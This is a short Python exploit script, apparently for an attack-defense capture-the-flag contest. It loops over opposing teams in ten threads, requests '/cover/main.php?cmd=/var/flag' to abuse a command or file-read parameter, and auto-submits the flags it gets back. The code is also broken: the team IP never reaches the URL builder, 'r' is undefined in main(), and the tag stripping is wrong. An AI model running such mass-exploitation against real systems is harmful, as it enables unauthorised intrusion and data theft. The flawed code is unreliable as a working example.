#!/usr/bin/python3

import requests
import random
import string
import json
import threading
from datetime import datetime
from termcolor import colored
from utilities import extract_flag, submit_flag

s = requests.Session()
host = '127.0.0.1'
port = 80

url = lambda x: f'http://{host}:{port}' + x

teams = json.load(open('team.json'))[::-1][6:]

def random_string(l):
    return ''.join(random.choice(string.ascii_letters) for i in range(l))

def exploit():
	r = s.get(url("/cover/main.php?cmd=/var/flag"), timeout=4)
	
	return r.text

def main():
	while True:
		if len(teams) == 0:
			return
		else:
			team = teams.pop()
		try:
			host = team['ip']
			print(colored(f'[EXPLOIT][{datetime.now()}] Exploiting team {team["name"]} at {url("/")}', 'magenta', attrs=["bold"]))

			response = exploit()

			flag = extract_flag(response)
			flag = str(r.text).strip('<pre>')
			flag = str(r.text).strip('</pre>')

			if flag != "404 not found":
				print(colored(f'	[FLAG] {flag}', 'green', attrs=["bold"]))
				submit_flag(flag)
		except Exception:
			print(colored(f'[FAIL][{datetime.now()}] Exploit Failed for {team["name"]}', 'red', attrs=["bold"]))

jobs = []

for i in range(10):
    x = threading.Thread(target=main)
    jobs.append(x)
    x.start()

for job in jobs:
    job.join()